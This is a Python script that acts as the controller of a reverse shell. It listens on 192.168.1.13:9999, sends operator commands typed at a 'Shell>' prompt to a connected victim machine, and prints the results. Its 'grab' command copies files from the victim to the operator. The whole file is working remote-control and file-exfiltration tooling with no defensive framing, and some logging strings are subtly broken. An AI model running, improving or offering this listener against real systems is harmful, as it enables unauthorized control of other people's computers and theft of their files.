import socket  # Needed for connection
import os  # Needed for file operation
import logging  # Needed for logging
import sys

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


def transfer(conn, command):
    try:
        conn.send(command.encode())
        file_name = command.split("*")[1]
        with open(file_name, "wb") as file:
            while True:
                bits = conn.recv(1024)
                if b"Unable to find out the file" in bits:
                    print("File Doesn't exists")
                    logging.error("Unable to find out the file")
                    break
                elif bits.endswith(b"DONE"):
                    print("Transfer Completed")
                    break
                else:
                    file.write(bits)
    except Exception as e:
        logging.error("Error During File Transfer: {e}")


def connect(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.bind((server_ip, server_port))
            client.listen(1)
            logging.info(
                "Listening of Incoming Connection on {0}:{1}".format(
                    server_ip, server_port
                )
            )
            print(
                "Listening of Incoming Connection on {0}:{1}".format(
                    server_ip, server_port
                )
            )
            conn, addr = client.accept()
            with conn:
                print("Got Connection from {0}:{1}".format(addr[0], addr[1]))
                logging.info("Got Connection from {0}:{1}".format(addr[0], addr[1]))
                while True:
                    try:
                        command = input("Shell> ")
                        if command.strip() == "":
                            continue
                        elif command.lower().strip() == "exit":
                            conn.send("exit".encode())
                            conn.close()
                            break
                        elif command.startswith("grab"):
                            transfer(conn, command)
                        else:
                            conn.send(command.encode())
                            print((conn.recv(1024)).decode())
                    except KeyboardInterrupt:
                        print("Exiting...")
                        sys.exit()
        except KeyboardInterrupt:
            print("Exiting...")
            sys.exit()
        except Exception as e:
            logging.error("Error during connection: {e}")


def main():
    server_ip = "192.168.1.13"
    server_port = 9999
    connect(server_ip, server_port)


if __name__ == "__main__":
    main()
